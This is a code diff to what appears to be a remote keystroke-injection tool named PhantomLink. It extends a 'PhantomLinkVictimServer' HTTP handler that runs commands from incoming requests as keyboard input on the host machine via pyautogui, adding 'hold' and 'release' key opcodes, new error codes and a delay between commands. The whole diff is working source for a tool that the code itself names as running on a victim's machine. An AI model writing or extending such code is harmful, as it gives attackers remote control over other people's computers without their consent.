@@ -19,12 +19,25 @@ def try_run_from_phantomscript_command(phantomscript_command: str) -> tuple:
 
         elif opcode == 'press':
             for key in args:
-                if not does_key_exist(key): return (400, f"{key}: Invalid key.")
+                if not does_key_exist(key): return (422, f"{key}: Invalid key.")
             
             pyautogui.hotkey(args)
 
             return (200, "Successful.")
+        
+        elif opcode == 'hold':
+            for key in args:
+                if not does_key_exist(key): return (422, f"{key}: Invalid key.")
+                pyautogui.keyDown(key)
 
+            return (200, "Successful.")
+        
+        elif opcode == 'release':
+            for key in args:
+                if not does_key_exist(key): return (422, f"{key}: Invalid key.")
+                pyautogui.keyUp(key)
+
+            return (200, "Successful.")
         return (422, f" {opcode}: Invalid opcode / command.")
 
     except Exception as e:
@@ -39,6 +52,7 @@ class PhantomLinkVictimServer(BaseHTTPRequestHandler):
                 for line in payload.splitlines():
                     currentStatusCode, message = try_run_from_phantomscript_command(line)
                     if not str(currentStatusCode).startswith(("4", "3")): continue
+                    sleep(0.1)
                         
                     self.send_response(currentStatusCode)
                     self.end_headers()
